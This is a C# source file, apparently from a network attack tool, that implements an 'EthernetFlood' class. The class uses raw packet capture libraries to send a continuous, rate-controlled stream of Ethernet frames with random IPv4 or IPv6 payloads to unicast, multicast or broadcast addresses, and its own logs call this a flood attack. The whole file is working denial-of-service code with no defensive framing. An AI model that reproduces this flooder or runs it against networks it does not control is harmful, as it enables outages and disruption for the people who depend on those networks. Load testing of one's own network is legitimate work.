using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using SharpPcap;
using SharpPcap.LibPcap;
using NLog;
using System.Diagnostics;

namespace Dorothy.Models
{
    public class EthernetFlood : IDisposable
    {
        private readonly PacketParameters _parameters;
        private readonly CancellationToken _cancellationToken;
        private readonly EthernetPacketType _packetType;
        private readonly bool _useIPv6;
        private LibPcapLiveDevice? _device;
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private const int PacketSize = 1400; // Standard size for good throughput
        private const int MICRO_BATCH_SIZE = 10; // Send packets in small batches for better rate control
        public event EventHandler<PacketEventArgs>? PacketSent;

        public enum EthernetPacketType
        {
            Unicast,
            Multicast,
            Broadcast
        }

        public EthernetFlood(PacketParameters parameters, EthernetPacketType packetType, CancellationToken cancellationToken, bool useIPv6 = false)
        {
            _parameters = parameters;
            _packetType = packetType;
            _cancellationToken = cancellationToken;
            _useIPv6 = useIPv6 || parameters.SourceIp.AddressFamily == System.Net.Sockets.AddressFamily.InterNetworkV6;
        }

        protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
        {
            PacketSent?.Invoke(this, new PacketEventArgs(packet, sourceIp, destinationIp, port));
        }

        public async Task StartAsync()
        {
            try
            {
                var allDevices = CaptureDeviceList.Instance;
                _device = allDevices.OfType<LibPcapLiveDevice>()
                    .FirstOrDefault(d => d.Interface.Addresses
                        .Any(a => a.Addr?.ipAddress?.ToString() == _parameters.SourceIp.ToString()));

                if (_device == null)
                {
                    throw new Exception("No suitable network interface found");
                }

                _device.Open();
                Logger.Info($"Started Ethernet {_packetType} flood attack ({(_useIPv6 ? "IPv6" : "IPv4")})");

                // Create a sample packet to get actual size
                var samplePacket = CreatePacket();
                int totalPacketSize = samplePacket.Bytes.Length;
                
                // Calculate precise rate: Mbps -> bytes per second (accounting for actual packet size)
                // Use actual packet size from the created packet
                long targetBytesPerSecond = _parameters.BytesPerSecond;
                double packetsPerSecond = (double)targetBytesPerSecond / totalPacketSize;
                double microsecondsPerPacket = 1_000_000.0 / packetsPerSecond;
                long ticksPerPacket = (long)(microsecondsPerPacket * Stopwatch.Frequency / 1_000_000.0);
                
                var stopwatch = new Stopwatch();
                var packetsSent = 0L;
                var lastRateCheck = DateTime.UtcNow;

                // Pre-generate packet pool for better performance
                var packetPool = new Packet[MICRO_BATCH_SIZE];
                for (int i = 0; i < MICRO_BATCH_SIZE; i++)
                {
                    packetPool[i] = CreatePacket();
                }

                await Task.Run(() =>
                {
                    stopwatch.Start();
                    int poolIndex = 0;
                    long nextPacketTime = 0; // Track when next packet should be sent
                    
                    while (!_cancellationToken.IsCancellationRequested)
                    {
                        try
                        {
                            long currentTicks = stopwatch.ElapsedTicks;
                            
                            // Wait until it's time to send the next packet
                            if (currentTicks < nextPacketTime)
                            {
                                long waitTicks = nextPacketTime - currentTicks;
                                long waitMicroseconds = (waitTicks * 1_000_000L) / Stopwatch.Frequency;
                                
                                if (waitMicroseconds > 1000)
                                {
                                    Thread.Sleep((int)(waitMicroseconds / 1000));
                                }
                                
                                // Fine-grained spin wait
                                while (stopwatch.ElapsedTicks < nextPacketTime)
                                {
                                    if (_cancellationToken.IsCancellationRequested) return;
                                    Thread.SpinWait(10);
                                }
                            }

                            // Regenerate packet periodically for randomization
                            if (poolIndex % 100 == 0)
                            {
                                packetPool[poolIndex] = CreatePacket();
                            }
                            
                            // Send single packet
                            var packet = packetPool[poolIndex];
                            _device.SendPacket(packet);
                            var packetBytes = packet.Bytes;
                            OnPacketSent(packetBytes, _parameters.SourceIp, _parameters.DestinationIp, _parameters.DestinationPort);
                            packetsSent++;
                            poolIndex = (poolIndex + 1) % MICRO_BATCH_SIZE;

                            // Schedule next packet
                            nextPacketTime = stopwatch.ElapsedTicks + ticksPerPacket;

                            // Log rate every second
                            var now = DateTime.UtcNow;
                            if ((now - lastRateCheck).TotalSeconds >= 1.0)
                            {
                                var actualRate = packetsSent / (now - lastRateCheck).TotalSeconds;
                                var actualMbps = (actualRate * totalPacketSize * 8) / 1_000_000.0;
                                Logger.Info($"Send rate: {actualRate:F0} packets/sec ({actualMbps:F2} Mbps)");
                                packetsSent = 0;
                                lastRateCheck = now;
                            }
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Error sending packet: {ex.Message}");
                            throw;
                        }
                    }
                }, _cancellationToken);
            }
            catch (Exception ex)
            {
                Logger.Error($"Ethernet flood attack failed: {ex.Message}");
                throw;
            }
        }

        private Packet CreatePacket()
        {
            var ethernetPacket = CreateEthernetPacket();
            Packet ipPacket;
            
            if (_useIPv6)
            {
                ipPacket = CreateIPv6Packet();
            }
            else
            {
                ipPacket = CreateIPv4Packet();
            }
            
            ethernetPacket.PayloadPacket = ipPacket;
            return ethernetPacket;
        }

        private EthernetPacket CreateEthernetPacket()
        {
            PhysicalAddress destMac = _packetType switch
            {
                EthernetPacketType.Unicast => new PhysicalAddress(_parameters.DestinationMac),
                EthernetPacketType.Multicast => _useIPv6 
                    ? PhysicalAddress.Parse("33-33-00-00-00-01") // IPv6 multicast
                    : PhysicalAddress.Parse("01-00-5E-00-00-01"), // IPv4 multicast
                EthernetPacketType.Broadcast => PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF"),
                _ => throw new ArgumentException("Invalid Ethernet packet type")
            };

            var etherType = _useIPv6 ? EthernetType.IPv6 : EthernetType.IPv4;

            return new EthernetPacket(
                new PhysicalAddress(_parameters.SourceMac),
                destMac,
                etherType);
        }

        private IPv4Packet CreateIPv4Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv4Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                Protocol = ProtocolType.Raw,
                PayloadData = payload,
                TimeToLive = _parameters.Ttl
            };
        }

        private IPv6Packet CreateIPv6Packet()
        {
            var payload = new byte[PacketSize];
            Random.Shared.NextBytes(payload);

            return new IPv6Packet(_parameters.SourceIp, _parameters.DestinationIp)
            {
                PayloadData = payload,
                HopLimit = _parameters.Ttl
            };
        }

        public void Dispose()
        {
            if (_device != null)
            {
                if (_device.Opened)
                {
                    _device.Close();
                }
                _device.Dispose();
                Logger.Info("Ethernet flood device closed and disposed");
            }
        }
    }
} 